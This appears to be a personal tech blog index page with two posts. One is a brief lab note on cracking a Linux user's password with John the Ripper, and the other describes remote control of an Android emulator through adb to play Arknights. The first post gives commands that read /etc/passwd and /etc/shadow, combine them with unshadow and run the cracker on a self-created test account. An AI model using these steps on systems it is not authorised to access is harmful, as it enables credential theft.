<h2 id="use-john-with-linux-password"><a href="#use-john-with-linux-password" class="headerlink" title="use john with linux password"></a>use john with linux password</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep victim &#x2F;etc&#x2F;passwd &gt; test_pw.txt</span><br><span class="line">sudo grep victim &#x2F;etc&#x2F;shadow &gt; test_shadow.txt</span><br><span class="line">unshadow test_pw.txt test_shadow.txt &gt; test_unshadow.txt</span><br><span class="line">john est_unshadow.txt</span><br></pre></td></tr></table></figure>

<p>john need the unshadow format as input hash  </p>
<p>I created a victim user, but the hash type is $y$ which can not be cracked </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/06/29/Arknights-Remote-Access/">Arknights Remote Access</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-06-28</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Project/">Project</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Thoughts/">Thoughts</a></span><div class="content"><h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>I played Arknights on Bilibili Server(Android only) with Android emulator, tries to clear some daily task with my iOS device.</p>
<h1 id="Attempts"><a href="#Attempts" class="headerlink" title="Attempts"></a>Attempts</h1><ul>
<li>Approch 1: UI less arknights: need to capture and analyze some packages. I searched on github, all auto scripts are based on Android Emulator. </li>
<li>Approch 2: have an android emulator running on remote server, and control it with those auto scripts (CV based). However, it seems rented cloud VMs does not support nested virtualization (android emulator is another vm)</li>
<li>Approch 3 (Current approch): Run emulator on my own windows machine, connect both windows machine and mobile phone (or browser if provide a web based console) to the server. Drawback: access speed would be slow, since need to communicate with both web client and windows machine. Need to keep my own PC running at home while access it. Need authentication to avoid Man-in-the-middle attack. Tried to find a way directly connect two machines behind NAT (NAT Traversal)</li>
</ul>
<h1 id="Design-PC-side"><a href="#Design-PC-side" class="headerlink" title="Design - PC side"></a>Design - PC side</h1><h2 id="Connect-Emulator-with-adb"><a href="#Connect-Emulator-with-adb" class="headerlink" title="Connect Emulator with adb"></a>Connect Emulator with adb</h2><p>Download android sdk platform tool (adb included), add to PATH  </p>
<p>default adb server running on <code>127.0.0.1:5037</code></p>
<p>Mumu emulator</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb connect 127.0.0.1:7555</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure>

</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>